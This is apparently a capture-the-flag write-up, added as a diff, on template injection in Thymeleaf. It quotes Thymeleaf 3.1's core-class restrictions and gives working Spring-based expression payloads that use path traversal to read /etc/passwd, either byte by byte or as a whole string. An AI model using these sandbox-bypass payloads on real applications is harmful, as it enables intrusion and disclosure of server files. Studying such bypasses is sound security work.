@@ -1,0 +1,36 @@
+Solution:
+This is to be solved via Thymeleaf SSTI.
+The latest version (https://www.thymeleaf.org/doc/articles/thymeleaf31whatsnew.html) implemented drastic measures and disallowed many common SSTI methods:
+
+---
+Thymeleaf 3.1 establishes a general restriction on the use of classes from core packages: java.*, javax.*, jakarta.*, jdk.*, org.ietf.jgss.*, org.omg.*, org.w3c.dom.*, org.xml.sax.*, com.sun.* and sun.*.
+
+Method/constructor calling is now forbidden for classes in these packages, as well as static references.
+
+As an exception to this restriction, some classes in these packages are always allowed:
+
+Basic java.lang.* and java.math.* classes: java.lang.Boolean, java.lang.Byte, java.lang.Character, java.lang.Double, java.lang.Enum, java.lang.Float, java.lang.Integer, java.lang.Long, java.lang.Math, java.lang.Number, java.lang.Short, java.lang.String, java.math.BigDecimal, java.math.BigInteger, java.math.RoundingMode.
+
+Collection classes and interfaces: java.util.Collection, java.util.Enumeration, java.util.Iterable, java.util.Iterator, java.util.List, java.util.ArrayList, java.util.LinkedList, java.util.Set, java.util.HashSet, java.util.LinkedHashSet, java.util.Map, java.util.Map.Entry, java.util.HashMap, java.util.LinkedHashMap. Note: interface methods (e.g. Map#get(key)) are commonly allowed for any implementation, but the specific implementations listed here can additionally be constructed and statically referenced.
+
+Other commonly used classes in java.util.*: java.util.Properties, java.util.Optional, java.util.stream.Stream, java.util.Locale, java.util.Date, java.util.Calendar.
+---
+
+Thus we cannot instantiate java.lang.Runtime to pop a shell, or even java.io.File. But there is Spring, which provides org.springframework.core.io.FileSystemResourceLoader. It loads resources from a relative path but does not implement checks, so we can access /etc/passwd where GECOS is located.
+
+The payload:
+Get length of file content
+${'bcd'.getClass().forName('org.springframework.core.io.FileSystemResourceLoader').newInstance().getResource('../../../../../../../../../../../../../etc/passwd').getContentAsByteArray().length}
+
+
+
+Old method (please do not allow this):
+Since all utility methods, static refs are proh*bited we have to leak the flag byte by byte per request.
+${'bcd'.getClass().forName('org.springframework.core.io.FileSystemResourceLoader').newInstance().getResource('../../../../../../../../../../../../../etc/passwd').getContentAsByteArray()[i]}
+where i is 0 to (len-1)
+
+New method:
+We can get a charset to pass in to getContentAsString(Charset charset);. but because java.nio.charset.Charset cannot be directly instantiated and calling the static default getter is prohibited, after a long time searching through Spring's GitHub source I found this tinyurl.com/45ftf363 which allows us to get the default charset from an instantiation of FormHttpMessageWriter, which is not restricted. Thus the payload:
+
+
+${'bcd'.getClass().forName('org.springframework.core.io.FileSystemResourceLoader').newInstance().getResource('../../../../../../../../../../../../../etc/passwd').getContentAsString('bcd'.getClass().forName('org.springframework.http.codec.FormHttpMessageWriter').newInstance().getDefaultCharset())}
